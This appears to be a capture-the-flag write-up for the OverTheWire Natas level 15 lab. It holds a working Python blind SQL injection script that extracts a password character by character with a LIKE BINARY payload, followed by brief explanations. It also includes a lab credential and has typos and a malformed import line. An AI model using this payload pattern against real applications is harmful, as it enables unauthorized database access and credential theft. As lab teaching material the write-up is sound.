
---

Blind SQL injection : Occurs when an applicatoin is vulnerable to SQL injectoin, but HTTP responses do not contain the results of the relevent SQL query or the details of any database erroes.

```
import `requests`
import string

url = "http://natas15.natas.labs.overthewire.org/"
auth = ("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx")

chars = string.ascii_letters + string.digits

password = ""

while len(password) < 32:
    for c in chars:
        payload = f'natas16" AND password LIKE BINARY "{password}{c}%"#'

        r = requests.post(
            url,
            auth = auth,
            data = {"username": payload},
            timeout = 10
        )

        if "This user exists" in r.text:
            password += c
            print(password)
            break
```

For Python, `f '...'` is an f-string, string in {} will be replaced by Python variables.

For MySQL, `LIKE` is used for preform string comparison, `%` is an universal char in `LIKE` , usually, the case sensitivity of `LIKE` often depends on the column’s collation; in many cases, `LIKE` comparisons are case-insensitive, so we add `BINARY`.

`requests` is a Python kit that helps you make HTTP requests(`GET / POST / PUT / DELETE`)
``
`r` is a reqonse object which contain `headers, text, content, elapsed`, etc.

`r.text` is the source code(HTML) that the server responsed.

